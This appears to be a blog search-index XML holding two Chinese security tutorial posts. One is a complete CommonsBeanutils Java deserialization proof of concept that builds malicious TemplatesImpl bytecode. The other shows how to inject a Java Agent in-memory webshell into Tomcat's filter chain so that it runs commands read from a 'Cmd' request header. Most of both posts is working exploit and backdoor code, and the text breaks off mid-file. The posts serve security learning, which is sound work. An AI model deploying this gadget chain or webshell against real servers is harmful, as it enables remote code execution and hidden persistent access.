<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CommonsBeanutils反序列化</title>
      <link href="/2023/09/11/CommonsBeanutils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/09/11/CommonsBeanutils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="CommonsBeanutils反序列化"><a href="#CommonsBeanutils反序列化" class="headerlink" title="CommonsBeanutils反序列化"></a>CommonsBeanutils反序列化</h1><h2 id="CB1"><a href="#CB1" class="headerlink" title="CB1"></a>CB1</h2><p>环境搭建：</p><pre><code class="xml">&lt;dependencies&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.javassist&lt;/groupId&gt;        &lt;artifactId&gt;javassist&lt;/artifactId&gt;        &lt;version&gt;3.22.0-GA&lt;/version&gt;    &lt;/dependency&gt;    &lt;dependency&gt;        &lt;groupId&gt;commons-beanutils&lt;/groupId&gt;        &lt;artifactId&gt;commons-beanutils&lt;/artifactId&gt;        &lt;version&gt;1.9.4&lt;/version&gt;    &lt;/dependency&gt;&lt;/dependencies&gt;</code></pre><p>下图是学习CC链的时候画的图：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/CC.svg" alt="CC"></p><p>先回顾一下CC2中后半段的链子，即通过构造恶意字节码进行利用</p><pre><code>TemplatesImpl.newTransformer()--&gt;    TemplatesImpl.getTransletInstance()--&gt;        TemplatesImpl.defineTransletClasses()--&gt;            TemplatesImpl.TransletClassLoader.defineClass()--&gt;                Runtime.getRuntime.exec()</code></pre><p>具体这里就不分析了</p><p>实现代码如下：</p><pre><code class="java">public static void main(String[] args ) throws IOException, NotFoundException, CannotCompileException, IllegalAccessException, NoSuchFieldException, ClassNotFoundException, TransformerConfigurationException &#123;        //构造恶意类        ClassPool pool = ClassPool.getDefault();        CtClass Evil = pool.makeClass(&quot;Evil&quot;);        Evil.setSuperclass(pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;));        String name = &quot;Evil&quot;;        Evil.setName(name);        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;        CtConstructor constructor = Evil.makeClassInitializer();        constructor.insertBefore(cmd);        byte[] bytes =Evil.toBytecode();        //通过反射使得_bytecodes=bytes        TemplatesImpl tmpl = new TemplatesImpl();        Field bytecodes = TemplatesImpl.class.getDeclaredField(&quot;_bytecodes&quot;);        bytecodes.setAccessible(true);        bytecodes.set(tmpl, new byte[][]&#123;bytes&#125;);        Field _name = TemplatesImpl.class.getDeclaredField(&quot;_name&quot;);        _name.setAccessible(true);        _name.set(tmpl,&quot;aaa&quot;);        Field _class = TemplatesImpl.class.getDeclaredField(&quot;_class&quot;);        _class.setAccessible(true);        _class.set(tmpl,null);        Field _tfactory = TemplatesImpl.class.getDeclaredField(&quot;_tfactory&quot;);        _tfactory.setAccessible(true);        _tfactory.set(tmpl,new TransformerFactoryImpl());        tmpl.newTransformer();//触发利用链    &#125;</code></pre><p>再来看看主角Commons-Beanutils</p><p>commons-beanutils中提供了一个静态方法<code>PropertyUtils.getProperty</code>，让使用者可以直接调用任意JavaBean的getter方法</p><p>跟进<code>getProperty</code>直到<code>getSimpleProperty</code>这里即可知道</p><pre><code class="java">public Object getSimpleProperty(Object bean, String name) throws IllegalAccessException, InvocationTargetException, NoSuchMethodException &#123;    if (bean == null) &#123;  ......    &#125; else &#123;        PropertyDescriptor descriptor = this.getPropertyDescriptor(bean, name);        if (descriptor == null) &#123;            throw new NoSuchMethodException(&quot;Unknown property &#39;&quot; + name + &quot;&#39; on class &#39;&quot; + bean.getClass() + &quot;&#39;&quot;);        &#125; else &#123;            Method readMethod = this.getReadMethod(bean.getClass(), descriptor);            if (readMethod == null) &#123;                throw new NoSuchMethodException(&quot;Property &#39;&quot; + name + &quot;&#39; has no getter method in class &#39;&quot; + bean.getClass() + &quot;&#39;&quot;);            &#125; else &#123;                Object value = this.invokeMethod(readMethod, bean, EMPTY_OBJECT_ARRAY);                return value;            &#125;        &#125;    &#125;&#125;</code></pre><p>具体用法是<code>PropertyUtils.getProperty(bean，name)</code>从对象bean中，调用属性name对应的getter方法，并返回getter方法的返回值</p><p>在org.apache.commons.beanutils.BeanComparator类中的compare方法利用了<code>PropertyUtils.getProperty</code>并且参数可以控制</p><pre><code class="java">public int compare(T o1, T o2) &#123;    if (this.property == null) &#123;        return this.internalCompare(o1, o2);    &#125; else &#123;        try &#123;            Object value1 = PropertyUtils.getProperty(o1, this.property);            Object value2 = PropertyUtils.getProperty(o2, this.property);            return this.internalCompare(value1, value2);        &#125; catch (IllegalAccessException var5) &#123;            throw new RuntimeException(&quot;IllegalAccessException: &quot; + var5.toString());        &#125; catch (InvocationTargetException var6) &#123;            throw new RuntimeException(&quot;InvocationTargetException: &quot; + var6.toString());        &#125; catch (NoSuchMethodException var7) &#123;            throw new RuntimeException(&quot;NoSuchMethodException: &quot; + var7.toString());        &#125;    &#125;&#125;</code></pre><p>要利用<code>PropertyUtils.getProperty</code>，首先要控制<code>this.property</code>为对应的属性名，通过构造函数可以知道，这个<code>property</code>可以在创建对象的时候设置</p><pre><code class="java">public BeanComparator(String property) &#123;    this(property, ComparableComparator.getInstance());&#125;public BeanComparator(String property, Comparator&lt;?&gt; comparator) &#123;    this.setProperty(property);    if (comparator != null) &#123;        this.comparator = comparator;    &#125; else &#123;        this.comparator = ComparableComparator.getInstance();    &#125;&#125;public void setProperty(String property) &#123;        this.property = property;    &#125;</code></pre><p>到这里可以知道，这个BeanComparator类的创建到调用compare可以调用任意对象的getter方法</p><p>但是还没有和上面CC2后半段链子联系起来，需要找到一个getter方法，这个getter方法里面调用了newTransformer()</p><p>这里找到的是：<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputProperties</code></p><pre><code class="java">public synchronized Properties getOutputProperties() &#123;    try &#123;        return newTransformer().getOutputProperties();    &#125;    catch (TransformerConfigurationException e) &#123;        return null;    &#125;&#125;</code></pre><p>到这里就可以和链子连接起来了，接着上面链子构造如下两行就能触发：</p><pre><code class="java">BeanComparator beanComparator = new BeanComparator&lt;&gt;(&quot;outputProperties&quot;);beanComparator.compare(tmpl,null);</code></pre><p>到这里还没有结束，继续寻找调用compare的地方</p><p>跟据CC链的那个图（文章开头的那个），已经能够找到前半段链子了</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230911150409170.png" alt="image-20230911150409170"></p><p>那就不分析了，直接”抄”过来就行</p><p>最终POC:</p><pre><code class="java">package org.example;import java.io.*;import java.lang.reflect.Field;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import javassist.*;import java.util.PriorityQueue;import org.apache.commons.beanutils.BeanComparator;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import javax.xml.transform.TransformerConfigurationException;public class Main &#123;    public static void main(String[] args ) throws IOException, NotFoundException, CannotCompileException, IllegalAccessException, NoSuchFieldException, ClassNotFoundException, TransformerConfigurationException &#123;        //构造恶意类        ClassPool pool = ClassPool.getDefault();        CtClass Evil = pool.makeClass(&quot;Evil&quot;);        Evil.setSuperclass(pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;));        String name = &quot;Evil&quot;;        Evil.setName(name);        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;        CtConstructor constructor = Evil.makeClassInitializer();        constructor.insertBefore(cmd);        byte[] bytes =Evil.toBytecode();        //通过反射使得_bytecodes=bytes        TemplatesImpl tmpl = new TemplatesImpl();        Field bytecodes = TemplatesImpl.class.getDeclaredField(&quot;_bytecodes&quot;);        bytecodes.setAccessible(true);        bytecodes.set(tmpl, new byte[][]&#123;bytes&#125;);        Field _name = TemplatesImpl.class.getDeclaredField(&quot;_name&quot;);        _name.setAccessible(true);        _name.set(tmpl,&quot;aaa&quot;);        Field _class = TemplatesImpl.class.getDeclaredField(&quot;_class&quot;);        _class.setAccessible(true);        _class.set(tmpl,null);        Field _tfactory = TemplatesImpl.class.getDeclaredField(&quot;_tfactory&quot;);        _tfactory.setAccessible(true);        _tfactory.set(tmpl,new TransformerFactoryImpl());//        tmpl.newTransformer();        BeanComparator beanComparator = new BeanComparator&lt;&gt;(&quot;outputProperties&quot;);//        beanComparator.compare(tmpl,null);        PriorityQueue queue = new PriorityQueue(2);        queue.add(1);        queue.add(2);        Field comparator_field = queue.getClass().getDeclaredField(&quot;comparator&quot;);        comparator_field.setAccessible(true);        comparator_field.set(queue,beanComparator);        Field queue_ = queue.getClass().getDeclaredField(&quot;queue&quot;);        queue_.setAccessible(true);        queue_.set(queue, new Object[]&#123;tmpl,1&#125;);        serialize(queue);        unserialize(&quot;ser.bin&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException&#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    &#125;&#125;</code></pre><h2 id="无CC依赖的反序列化链"><a href="#无CC依赖的反序列化链" class="headerlink" title="无CC依赖的反序列化链"></a>无CC依赖的反序列化链</h2><p>pom.xml中并没有导入CC依赖，这个CC依赖是CB依赖自带的</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230911152523615.png" alt="image-20230911152523615"></p><p>以上代码可成功构造反序列化利用，但是有一个问题是，由于 BeanComparator 的默认 comparator 是 ComparableComparator ，这是个 CommonCollections 中的类，导致了这明明是一条 CB 的触发链，却要同时依赖 CC。增加了很多利用的限制</p><p>回头看BeanComparator的构造函数：</p><pre><code class="java">public BeanComparator(String property) &#123;    this(property, ComparableComparator.getInstance());&#125;public BeanComparator(String property, Comparator&lt;?&gt; comparator) &#123;    this.setProperty(property);    if (comparator != null) &#123;        this.comparator = comparator;    &#125; else &#123;        this.comparator = ComparableComparator.getInstance();    &#125;&#125;public void setProperty(String property) &#123;        this.property = property;    &#125;</code></pre><p>如果在创建<code>BeanComparator</code>对象的时候，传给它一个JDK自带或CB依赖自带的,并且可以序列化的<code>comparator</code>，这不就实现无CC依赖利用了</p><p>满足条件的有<code>java.util.Collections$ReverseComparator</code> 和 <code>java.lang.String$CaseInsensitiveComparator</code> 等。</p><p>如果使用的是<code>java.lang.String$CaseInsensitiveComparator</code></p><pre><code class="java">public static final Comparator&lt;String&gt; CASE_INSENSITIVE_ORDER                                     = new CaseInsensitiveComparator();private static class CaseInsensitiveComparator        implements Comparator&lt;String&gt;, java.io.Serializable &#123;    // use serialVersionUID from JDK 1.2.2 for interoperability    private static final long serialVersionUID = 8575799808933029326L;    public int compare(String s1, String s2) &#123;        int n1 = s1.length();        int n2 = s2.length();        int min = Math.min(n1, n2);        for (int i = 0; i &lt; min; i++) &#123;            char c1 = s1.charAt(i);            char c2 = s2.charAt(i);            if (c1 != c2) &#123;                c1 = Character.toUpperCase(c1);                c2 = Character.toUpperCase(c2);                if (c1 != c2) &#123;                    c1 = Character.toLowerCase(c1);                    c2 = Character.toLowerCase(c2);                    if (c1 != c2) &#123;                        // No overflow because of numeric promotion                        return c1 - c2;                    &#125;                &#125;            &#125;        &#125;        return n1 - n2;    &#125;    /** Replaces the de-serialized object. */    private Object readResolve() &#123; return CASE_INSENSITIVE_ORDER; &#125;&#125;</code></pre><p>只需要修改</p><pre><code class="java">BeanComparator beanComparator = new BeanComparator&lt;&gt;(&quot;outputProperties&quot;);</code></pre><p>改为：</p><pre><code class="java">BeanComparator beanComparator = new BeanComparator&lt;&gt;(&quot;outputProperties&quot;,String.CASE_INSENSITIVE_ORDER);</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230911165009967.png" alt="image-20230911165009967"></p><p>如果使用的是<code>java.util.Collections$ReverseComparator</code> ,只需要通过反射实例化comparator即可</p><pre><code class="java">Class c = Class.forName(&quot;java.util.Collections$ReverseComparator&quot;);Constructor&lt;?&gt; constructor1 = c.getDeclaredConstructor();constructor1.setAccessible(true);Comparator comparator = (Comparator) constructor1.newInstance();BeanComparator beanComparator = new BeanComparator&lt;&gt;(&quot;outputProperties&quot;,comparator);</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java Agent内存马</title>
      <link href="/2023/09/04/Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2023/09/04/Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h1 id="JavaAgent内存马"><a href="#JavaAgent内存马" class="headerlink" title="JavaAgent内存马"></a>JavaAgent内存马</h1><p>在 jdk 1.5 之后引入了 java.lang.instrument 包，该包提供了检测 java 程序的 Api，比如用于监控、收集性能信息、诊断问题，通过 java.lang.instrument 实现的工具我们称之为 Java Agent ，Java Agent 能够在不影响正常编译的情况下来修改字节码，即动态修改已加载或者未加载的类，包括类的属性、方法</p><p>Agent 内存马的实现就是利用了这一特性使其动态修改特定类的特定方法，将我们的恶意方法添加进去</p><p>说白了 Java Agent 只是一个 Java 类而已，只不过普通的 Java 类是以 main 函数作为入口点的，Java Agent 的入口点则是 premain 和 agentmain</p><p>Java Agent 支持两种方式进行加载：</p><h2 id="premain-了解"><a href="#premain-了解" class="headerlink" title="premain(了解)"></a>premain(了解)</h2><p>实现 premain 方法，在启动时进行加载 （该特性在 jdk 1.5 之后才有）</p><p>首先创建一个demo</p><pre><code class="java">package org.example;import java.lang.instrument.Instrumentation;public class demo &#123;    public static void premain(String agentArgs, Instrumentation inst) throws Exception&#123;        System.out.println(agentArgs);    &#125;&#125;</code></pre><p>打包成jar包</p><pre><code class="xml">&lt;build&gt;        &lt;pluginManagement&gt;            &lt;plugins&gt;                &lt;plugin&gt;                    &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;                    &lt;artifactId&gt;maven-jar-plugin&lt;/artifactId&gt;                    &lt;version&gt;2.2&lt;/version&gt;                    &lt;configuration&gt;                        &lt;archive&gt;                            &lt;manifestEntries&gt;                                &lt;Premain-Class&gt;org.example.demo&lt;/Premain-Class&gt;                                &lt;Can-Redefine-Classes&gt;true&lt;/Can-Redefine-Classes&gt;                                &lt;Can-Retransform-Classes&gt;true&lt;/Can-Retransform-Classes&gt;                            &lt;/manifestEntries&gt;                        &lt;/archive&gt;                        &lt;skip&gt;true&lt;/skip&gt;                    &lt;/configuration&gt;                &lt;/plugin&gt;            &lt;/plugins&gt;        &lt;/pluginManagement&gt;    &lt;/build&gt;</code></pre><p><code>&lt;Premain-Class&gt;</code>：指定了项目中的主类（Main Class）。</p><p><code>&lt;Can-Redefine-Classes&gt;</code>：设定是否允许重新定义已加载的类。</p><p><code>&lt;Can-Retransform-Classes&gt;</code>：设定是否允许对已加载的类进行转换。</p><p>再写一个普通的java程序</p><pre><code class="java">package org.example;public class Main &#123;    public static void main(String[] args) &#123;        System.out.println(&quot;Hello world!&quot;);    &#125;&#125;</code></pre><p>也打包成jar包</p><pre><code class="xml">&lt;build&gt;        &lt;pluginManagement&gt;            &lt;plugins&gt;                &lt;plugin&gt;                    &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;                    &lt;artifactId&gt;maven-jar-plugin&lt;/artifactId&gt;                    &lt;version&gt;2.2&lt;/version&gt;                    &lt;configuration&gt;                        &lt;archive&gt;                            &lt;manifestEntries&gt;&lt;!--                                &lt;Premain-Class&gt;org.example.demo&lt;/Premain-Class&gt;--&gt;&lt;!--                                &lt;Can-Redefine-Classes&gt;true&lt;/Can-Redefine-Classes&gt;--&gt;&lt;!--                                &lt;Can-Retransform-Classes&gt;true&lt;/Can-Retransform-Classes&gt;--&gt;                                &lt;Main-Class&gt;org.example.Main&lt;/Main-Class&gt;                            &lt;/manifestEntries&gt;                        &lt;/archive&gt;                        &lt;skip&gt;true&lt;/skip&gt;                    &lt;/configuration&gt;                &lt;/plugin&gt;            &lt;/plugins&gt;        &lt;/pluginManagement&gt;    &lt;/build&gt;</code></pre><p>因为是启动时加载，所以运行方式如下</p><pre><code class="shell">java -javaagent:demo.jar -jar main.jar</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230904100741924.png" alt="image-20230904100741924"></p><p>因为demo中的premain没有接收到参数<code>agentArgs</code> , 所以打印出null</p><p>传参如下</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230904101121381.png" alt="image-20230904101121381"></p><p>可以发现这个demo.jar的premain比main.jar的main先执行</p><p>premain还有另外一个参数<code>Instrumentation inst</code>   这个该如何使用？</p><p>Instrumentation 是 JVMTIAgent（JVM Tool Interface Agent）的一部分，Java agent通过这个类和目标 JVM 进行交互，从而达到修改数据的效果</p><p>在 Instrumentation 中增加了名叫 transformer 的 Class 文件转换器，转换器可以改变二进制流的数据</p><p>Transformer 可以对未加载的类进行拦截，同时可对已加载的类进行重新拦截，所以根据这个特性我们能够实现动态修改字节码</p><pre><code class="java">public interface Instrumentation &#123;    // 增加一个 Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。    void addTransformer(ClassFileTransformer transformer);    // 删除一个类转换器    boolean removeTransformer(ClassFileTransformer transformer);    // 在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。    void retransformClasses(Class&lt;?&gt;... classes) throws UnmodifiableClassException;    // 判断目标类是否能够修改。    boolean isModifiableClass(Class&lt;?&gt; theClass);    // 获取目标已经加载的类。    @SuppressWarnings(&quot;rawtypes&quot;)    Class[] getAllLoadedClasses();    ......&#125;</code></pre><p>下面是几个常用的方法：</p><p><strong>addTransformer</strong></p><p>addTransformer 方法来用于注册 Transformer，所以我们可以通过编写 ClassFileTransformer 接口的实现类来注册我们自己的转换器</p><pre><code class="java">void    addTransformer(ClassFileTransformer transformer, boolean canRetransform);void    addTransformer(ClassFileTransformer transformer);</code></pre><p>ClassFileTransformer 接口如下</p><pre><code class="java">public interface ClassFileTransformer &#123;    default byte[]    transform(  ClassLoader         loader,                String              className,                Class&lt;?&gt;            classBeingRedefined,                ProtectionDomain    protectionDomain,                byte[]              classfileBuffer)        throws IllegalClassFormatException &#123;        return null;    &#125;        default byte[]    transform(  Module              module,                ClassLoader         loader,                String              className,                Class&lt;?&gt;            classBeingRedefined,                ProtectionDomain    protectionDomain,                byte[]              classfileBuffer)        throws IllegalClassFormatException &#123;        // invoke the legacy transform method        return transform(loader,                         className,                         classBeingRedefined,                         protectionDomain,                         classfileBuffer);    &#125;&#125;</code></pre><p>这样当类加载的时候，会进入我们自己写的  ClassFileTransformer 接口的实现类 中的 transform 函数进行拦截</p><p><strong>getAllLoadedClasses</strong></p><p>getAllLoadedClasses 方法能列出所有已加载的 Class，我们可以通过遍历 Class 数组来寻找我们需要重定义的 class</p><p><strong>retransformClasses</strong> </p><p>retransformClasses 方法能对已加载的 class 进行重新定义，也就是说如果我们的目标类已经被加载的话，我们可以调用该函数，来重新触发这个Transformer的拦截，以此达到对已加载的类进行字节码修改的效果</p><h2 id="agentmain"><a href="#agentmain" class="headerlink" title="agentmain"></a>agentmain</h2><p>实现 agentmain 方法，在启动后进行加载 （该特性在 jdk 1.6 之后才有）</p><p>上面介绍的 premain 方法是在 JDK 1.5中提供的，所以在 jdk 1.5 的时候开发者只能在 main 加载之前添加手脚，但是很多时候例如我们内存马注入的情况都是处于 JVM 已运行了的情况，所以上面的方法就不是很有用，不过在 jdk 1.6 中实现了attach-on-demand（按需附着），我们可以使用 Attach API 动态加载 agent ，然而 Attach API 在 tool.jar 中，jvm 启动时是默认不加载该依赖的，需要我们在 classpath 中额外进行指定</p><p>启动后加载 agent 通过新的代理操作来实现：agentmain，使得可以在 main 函数开始运行之后再运行</p><p>和之前的 premain 函数一样，我们可以编写 agentmain 函数的 Java 类</p><pre><code class="java">public class demo &#123;    public static void agentmain(String agentArgs, Instrumentation inst) throws Exception&#123;        inst.addTransformer(new demoTransformer(),true);    &#125;&#125;</code></pre><p>demoTransformer：</p><pre><code class="java">import java.lang.instrument.ClassFileTransformer;import java.lang.instrument.IllegalClassFormatException;import java.security.ProtectionDomain;public class demoTransformer implements ClassFileTransformer &#123;    @Override    public byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException &#123;        System.out.println(&quot;--&gt;demoTransformer&quot;);                return ClassFileTransformer.super.transform(loader, className, classBeingRedefined, protectionDomain, classfileBuffer);    &#125;&#125;</code></pre><p>然后将其编译打包成jar包</p><pre><code class="xml">&lt;build&gt;        &lt;pluginManagement&gt;            &lt;plugins&gt;                &lt;plugin&gt;                    &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;                    &lt;artifactId&gt;maven-jar-plugin&lt;/artifactId&gt;                    &lt;version&gt;2.2&lt;/version&gt;                    &lt;configuration&gt;                        &lt;archive&gt;                            &lt;manifestEntries&gt;                                &lt;Agent-Class&gt;org.example.demo&lt;/Agent-Class&gt;                                &lt;Can-Redefine-Classes&gt;true&lt;/Can-Redefine-Classes&gt;                                &lt;Can-Retransform-Classes&gt;true&lt;/Can-Retransform-Classes&gt;&lt;!--                                &lt;Main-Class&gt;org.example.Main&lt;/Main-Class&gt;--&gt;                            &lt;/manifestEntries&gt;                        &lt;/archive&gt;                        &lt;skip&gt;true&lt;/skip&gt;                    &lt;/configuration&gt;                &lt;/plugin&gt;            &lt;/plugins&gt;        &lt;/pluginManagement&gt;    &lt;/build&gt;</code></pre><p>在 Java JDK6 以后实现启动后加载 Instrument 的是 Attach api。存在于 com.sun.tools.attach 里面有两个重要的类。</p><p>来查看一下该包中的内容，这里有两个比较重要的类，分别是 VirtualMachine 和 VirtualMachineDescriptor，其中我们重点关注 VirtualMachine 类</p><p>VirtualMachine 可以来实现获取系统信息，内存dump、现成dump、类信息统计（例如JVM加载的类）。里面配备有几个方法LoadAgent，Attach 和 Detach 。下面来看看这几个方法的作用</p><p><strong>Attach</strong> ：该类允许我们通过给attach方法传入一个jvm的pid(进程id)，远程连接到jvm上</p><pre><code class="java">VirtualMachine vm = VirtualMachine.attach(v.id());</code></pre><p><strong>loadAgent</strong>：向jvm注册一个代理程序agent，在该agent的代理程序中会得到一个Instrumentation实例，该实例可以 在class加载前改变class的字节码，也可以在class加载后重新加载。在调用Instrumentation实例的方法时，这些方法会使用ClassFileTransformer接口中提供的方法进行处理。</p><p><strong>Detach</strong>：从 JVM 上面解除一个代理(agent)</p><p>VirtualMachineDescriptor是一个描述虚拟机的容器类，配合 VirtualMachine 类完成各种功能。</p><p>写个测试类</p><p>把agent.jar注入到当前进程</p><pre><code class="java">import com.sun.tools.attach.VirtualMachine;import com.sun.tools.attach.VirtualMachineDescriptor;import java.util.List;public class Main &#123;        public static void main(String[] args) throws Exception&#123;            String path = &quot;agent.jar&quot;;//路径            List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();            for (VirtualMachineDescriptor v:list)&#123;                System.out.println(v.displayName());                if (v.displayName().contains(&quot;org.example.Main&quot;))&#123;                    // 将 jvm 虚拟机的 pid 号传入 attach 来进行远程连接                    VirtualMachine vm = VirtualMachine.attach(v.id());                    // 将我们的 agent.jar 发送给虚拟机                    System.out.println(v.id());                    vm.loadAgent(path);                    vm.detach();                &#125;            &#125;        &#125;&#125;</code></pre><p>运行结果：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230904161517636.png" alt="image-20230904161517636"></p><p>如果报错，尝试添加<code>-Djdk.attach.allowAttachSelf=true</code></p><h2 id="内存马写入"><a href="#内存马写入" class="headerlink" title="内存马写入"></a>内存马写入</h2><p>这里使用tomcat进行测试</p><p>Java web中，用户的请求到达Servlet之前，一定会经过 Filter，在学习Tomcat Filter内存马中了解到，发送请求一定经过<code>org.apache.catalina.core.ApplicationFilterChain</code>的doFilter方法，而且在还调用了两次</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230906110414522.png" alt="image-20230906110414522"></p><p>同时在 doFilter 中还封装了我们用户请求的 request 和 response ，那么如果我们能够注入该方法，那么我们不就可以直接获取用户的请求，将执行结果写在 response 中进行返回</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230906111901162.png" alt="image-20230906111901162"></p><p>首先注册我们的 demoTransformer ，然后遍历已加载的 class，如果存在的话那么就调用 retransformClasses 对其进行重定义</p><pre><code class="java">package org.example;import java.lang.instrument.Instrumentation;public class AgentMain &#123;    public static void agentmain(String agentArgs, Instrumentation inst) throws Exception&#123;        String CLASSNAME = &quot;org.apache.catalina.core.ApplicationFilterChain&quot;;        for (Class clazz : inst.getAllLoadedClasses())&#123;            if (clazz.getName().equals(CLASSNAME)) &#123;                inst.addTransformer(new demoTransformer(), true);                inst.retransformClasses(clazz);            &#125;        &#125;    &#125;&#125;</code></pre><p>demoTransformer 代码如下：</p><pre><code class="java">package org.example;import javassist.*;import java.io.IOException;import java.lang.instrument.ClassFileTransformer;import java.lang.instrument.IllegalClassFormatException;import java.security.ProtectionDomain;public class demoTransformer implements ClassFileTransformer&#123;    @Override    public byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException &#123;        String CLASSNAME = &quot;org.apache.catalina.core.ApplicationFilterChain&quot;;        String CLASSMETHOD = &quot;doFilter&quot;;        try &#123;            if (className.replace(&quot;/&quot;, &quot;.&quot;).equals(CLASSNAME)) &#123;                ClassPool pool = ClassPool.getDefault();                if (classBeingRedefined != null) &#123;                    ClassClassPath ccp = new ClassClassPath(classBeingRedefined);                    pool.insertClassPath(ccp);                                    &#125;                             CtClass clazz = pool.get(CLASSNAME);                CtMethod method = clazz.getDeclaredMethod(CLASSMETHOD);                method.insertBefore(&quot;javax.servlet.http.HttpServletRequest httpServletRequest = (javax.servlet.http.HttpServletRequest) request;\n&quot; +                        &quot;String cmd = httpServletRequest.getHeader(\&quot;Cmd\&quot;);\n&quot; +                        &quot;if (cmd != null)&#123;\n&quot; +                        &quot;    Process process = Runtime.getRuntime().exec(cmd);\n&quot; +                        &quot;    java.io.InputStream input = process.getInputStream();\n&quot; +                        &quot;    java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(input));\n&quot; +                        &quot;    StringBuilder sb = new StringBuilder();\n&quot; +                        &quot;    String line = null;\n&quot; +                        &quot;    while ((line = br.readLine()) != null)&#123;\n&quot; +                        &quot;        sb.append(line + \&quot;\\n\&quot;);\n&quot; +                        &quot;    &#125;\n&quot; +                        &quot;    br.close();\n&quot; +                        &quot;    input.close();\n&quot; +                        &quot;    response.getOutputStream().print(sb.toString());\n&quot; +                        &quot;    response.getOutputStream().flush();\n&quot; +                        &quot;    response.getOutputStream().close();\n&quot; +                        &quot;&#125;&quot;);                byte[] classbyte = clazz.toBytecode();                clazz.detach();                return classbyte;            &#125;        &#125; catch (Exception e) &#123;            e.printStackTrace();        &#125;        return classfileBuffer;    &#125;&#125;</code></pre><p>因为所有已加载的类都会经过<code>transform</code>方法，所有要用if进行判断，然后就是使用<code>javassist</code>修改字节码</p><p>需要注意的是</p><pre><code class="java">ClassPool pool = ClassPool.getDefault();if (classBeingRedefined != null) &#123;    ClassClassPath ccp = new ClassClassPath(classBeingRedefined);    pool.insertClassPath(ccp);&#125;</code></pre><p>这一段代码的作用是在当前类已经被定义的情况下，将它的字节码添加到ClassPool中。</p><p>具体来说，首先判断classBeingRedefined  (transform方法参数)是否为null，如果不为null，则说明当前类已经被定义过了。那么就可以创建一个ClassClassPath对象，该对象封装了classBeingRedefined的字节码文件的路径，然后将它添加到ClassPool中。</p><p>添加之后，ClassPool就可以找到并加载该类的字节码文件，这样就能够在字节码上进行修改和操作了。</p><p>后面就是在doFilter方法前面插入了<code>内存马</code>代码，从header头中读取Cmd的值作为命令，然后将命令执行结果通过response返回给用户</p><pre><code class="java">method.insertBefore(&quot;javax.servlet.http.HttpServletRequest httpServletRequest = (javax.servlet.http.HttpServletRequest) request;\n&quot; +                        &quot;String cmd = httpServletRequest.getHeader(\&quot;Cmd\&quot;);\n&quot; +                        &quot;if (cmd != null)&#123;\n&quot; +                        &quot;    Process process = Runtime.getRuntime().exec(cmd);\n&quot; +                        &quot;    java.io.InputStream input = process.getInputStream();\n&quot; +                        &quot;    java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(input));\n&quot; +                        &quot;    StringBuilder sb = new StringBuilder();\n&quot; +                        &quot;    String line = null;\n&quot; +                        &quot;    while ((line = br.readLine()) != null)&#123;\n&quot; +                        &quot;        sb.append(line + \&quot;\\n\&quot;);\n&quot; +                        &quot;    &#125;\n&quot; +                        &quot;    br.close();\n&quot; +                        &quot;    input.close();\n&quot; +                        &quot;    response.getOutputStream().print(sb.toString());\n&quot; +                        &quot;    response.getOutputStream().flush();\n&quot; +                        &quot;    response.getOutputStream().close();\n&quot; +                        &quot;&#125;&quot;);</code></pre><p>写完这个马后打包成jar，注意：一定要将依赖打包进jar里，避免没有依赖无法执行，然后报错</p><pre><code class="xml">&lt;build&gt;        &lt;plugins&gt;            &lt;plugin&gt;                